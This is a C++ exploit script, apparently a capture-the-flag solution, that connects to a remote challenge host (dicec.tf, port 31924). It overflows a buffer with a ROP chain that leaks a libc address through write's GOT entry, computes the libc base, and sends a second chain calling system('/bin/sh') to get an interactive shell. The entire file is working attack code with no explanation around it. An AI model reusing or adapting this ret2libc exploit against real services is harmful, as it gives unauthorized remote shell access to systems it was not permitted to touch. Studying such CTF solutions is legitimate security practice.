#include <iostream>
#include <string>
#include "pwntools.h"
#include <stdint.h>

int main() {

        using namespace pwn;
        Remote io("dicec.tf", 31924);
        uint64_t L_pop_rsi = 0x4011d1;
        uint64_t L_pop_rdi = 0x4011d3;
        uint64_t got_start = 0x404018;
        uint64_t rdx_set_gadget = 0x004011b0; /* : mov rdx, r14 ; mov rsi, r13 ; mov edi, r12d ; call qword [r15+rbx*8] ;  (1 found) */
        uint64_t stager_gadget = 0x4011CA; /* pop rbx, rbp, r12, r13, r14, r15 */
        uint64_t ret = 0x004010f8;

        uint64_t write_plt = 0x401030;
        uint64_t gets_plt = 0x401040;
        uint64_t main_offset = 0x401136;

        uint64_t system_offset = 0x55410;
        uint64_t write_offset = 0x1111d0;
        uint64_t str_bin_sh = 0x1b75aa;
        io.recvuntil("Your name: ");
        
        std::string L_rop_chain;
        L_rop_chain.resize(0x48);
        
        L_rop_chain += flat(
            L_pop_rdi, got_start + 0x50,
            gets_plt, stager_gadget,
            (uint64_t) 0, (uint64_t)0, 
            (uint64_t)0, (uint64_t)0, 
            (uint64_t)0x50,
            got_start + 0x50, rdx_set_gadget,
            (uint64_t)0, L_pop_rdi, (uint64_t)1,        
            L_pop_rsi, got_start, (uint64_t) 0,
            write_plt, main_offset
        );
        
        io.sendline(L_rop_chain);
        std::string L_payload;
        L_payload += p64(L_pop_rsi);
        io.sendline(L_payload);

        std::string libc_leak_str = io.recv(0x6);
        libc_leak_str.resize(0x8);
        uint64_t libc_leak = u64(libc_leak_str);
        uint64_t libc_base = libc_leak - write_offset;
        printf("[+] Libc base: %p\n", (void*)libc_base);

        io.recvuntil("Your name: ");
        std::string final_rop;
        final_rop.resize(0x48);
        final_rop += flat(
            L_pop_rdi, 
            libc_base + str_bin_sh, 
            libc_base + system_offset);
        io.sendline(final_rop);
        io.interactive();
        exit(0);
}